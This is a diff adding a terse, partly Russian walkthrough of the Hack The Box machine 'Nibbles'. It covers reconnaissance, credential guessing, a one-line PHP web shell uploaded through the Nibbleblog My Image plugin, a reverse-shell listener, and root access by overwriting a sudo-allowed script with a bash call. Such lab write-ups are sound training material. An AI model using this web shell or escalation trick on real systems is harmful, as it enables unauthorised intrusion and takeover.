@@ -1,3 +1,38 @@
+NIBBLES (HTB) — ATTACK CHAIN
+
+Reconnaissance
+├── nmap -sC -sV -A → 22 (OpenSSH 7.2p2), 80 (Apache 2.4.18 Ubuntu 16.04)
+└── Burp → комментарий в ответе: <!-- /nibbleblog/ directory. Nothing interesting here! -->
+
+Foothold
+├── /nibbleblog/ → "Powered by Nibbleblog"
+├── /nibbleblog/admin/boot/rules/98-constants.bit → NIBBLEBLOG_VERSION = 4.0.3 "Coffee"
+├── searchsploit nibbleblog → php/remote/38489.rb (Arbitrary File Upload)
+├── /nibbleblog/update.php → DB updated, ./content/private/
+├── /nibbleblog/content/private/users.xml → username: admin
+├── hydra → blacklist (5 fail_count → IP banned)
+├── новый VPN IP → admin:nibbles (ручной подбор)
+└── /nibbleblog/admin.php?controller=plugins&action=list → My Image plugin
+
+Exploitation (File Upload)
+├── cmd.php с GIF8; header: <?php echo system($_REQUEST['ipp']); ?>
+├── Upload через My Image → /nibbleblog/content/private/plugins/my_image/image.php
+├── ?ipp=whoami → RCE (nibbler)
+└── Reverse shell через POST → nc -lvnp 9001
+
+Lateral Movement / User Flag
+├── /home/nibbler/user.txt (user flag)
+└── Stabilize: python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Privilege Escalation
+├── sudo -l → (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+├── mkdir -p personal/stuff
+├── echo '/bin/bash -ip' > monitor.sh && chmod +x monitor.sh
+├── sudo ./monitor.sh → root
+└── cat /root/root.txt (root flag)
+
+
+
 Initial: PHP shell upload (Nibbleblog 4.0.3 My Image plugin)
 
 Root: sudo NOPASSWD on custom script → replaced with /bin/bash
